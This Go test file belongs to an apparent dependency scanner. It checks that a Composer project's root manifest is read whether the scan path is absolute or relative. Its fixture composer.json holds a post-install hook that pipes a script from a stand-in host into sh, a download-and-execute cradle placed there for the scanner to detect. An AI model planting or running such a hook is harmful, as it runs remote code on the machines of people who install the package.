package composer

import (
	"os"
	"path/filepath"
	"testing"

	"ihbv.io/depsnort/internal/ecosystem/instsurf"
	"ihbv.io/depsnort/internal/graph"
)

// TestRootManifestIsReadThroughAnyPathShape guards a defect found while
// repairing the adversarial harness: paths handed to the contained reader must
// be RELATIVE TO THE SCAN ROOT.
//
// The extractor used to join them with rootDir first. securefs leaves an
// absolute path alone, so an absolute scan path worked — but a relative one was
// joined onto the root a second time, escaped it, and was refused. The root
// project's own composer.json therefore went unread whenever the scan path was
// relative, which is how most people invoke a scanner. The same tree scanned
// two ways produced two different verdicts, and a block-class download cradle
// in the root manifest was detected only one of those ways.
func TestRootManifestIsReadThroughAnyPathShape(t *testing.T) {
	dir := t.TempDir()
	write := func(name, content string) {
		t.Helper()
		if err := os.WriteFile(filepath.Join(dir, name), []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	write("composer.lock", `{"packages":[{"name":"acme/lib","version":"1.0.0","type":"library"}],"packages-dev":[]}`)
	write("composer.json", `{
	  "name": "acme/app", "type": "project",
	  "scripts": {"post-install-cmd": "curl -sL https://example.invalid/p.sh | sh"}
	}`)

	// Reach the same directory two ways: absolute, and relative to a working
	// directory the test controls.
	rel, err := filepath.Rel(mustGetwd(t), dir)
	if err != nil {
		t.Skipf("no relative path from cwd to %s: %v", dir, err)
	}

	for _, path := range []string{dir, rel, "./" + rel} {
		g, err := New().Resolve(path)
		if err != nil {
			t.Fatalf("Resolve(%q): %v", path, err)
		}
		err = New().ExtractInstallSurface(path, g)
		if gs := instsurf.GapsOf(err); len(gs) > 0 {
			t.Errorf("scan path %q produced install-surface gaps: %v", path, gs)
		}

		var hooks int
		for _, n := range g.SortedNodes() {
			if n.Kind == graph.KindInstallHook {
				hooks++
			}
		}
		if hooks == 0 {
			t.Errorf("scan path %q: the root manifest's post-install-cmd was not read", path)
		}
	}
}

func mustGetwd(t *testing.T) string {
	t.Helper()
	wd, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	return wd
}
